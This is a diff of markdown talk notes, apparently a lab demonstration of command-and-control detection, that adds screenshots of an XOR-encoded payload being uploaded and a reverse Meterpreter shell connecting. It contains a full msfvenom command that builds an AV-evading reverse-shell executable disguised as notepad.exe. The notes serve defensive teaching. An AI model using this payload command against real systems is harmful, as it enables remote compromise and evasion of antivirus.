@@ -82,12 +82,21 @@ Then Windows Defender killed it:
 
 ## Attacker uses xor encoding and re-uploads plan.exe
 
+### Attacker
+
 `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -i 10 -e x64/xor_dynamic -x notepad.exe -f exe > plan.exe`
 
-They key difference: `-e x64/xor_dynamic`
+The key difference: `-e x64/xor_dynamic`
 
+![image](https://github.com/eric-conrad/c2-talk/assets/14989334/67d3616d-4c33-4ce9-b5b0-7c397cc24bcc)
 
+Upload and execute:
 
+<img width="400" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/15e2a3bc-083e-444a-8c6d-681ac8da9389">
+
+Reverse meterpreter shell connects to Metasploit:
+
+<img width="403" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/313a979c-d5fe-4383-86f9-147d30a1d263">
 
 **Long tail analysis**: `Get-WinEvent -Path C:\labs\valkyrie-security.evtx | Group-Object id -NoElement | sort count`
 
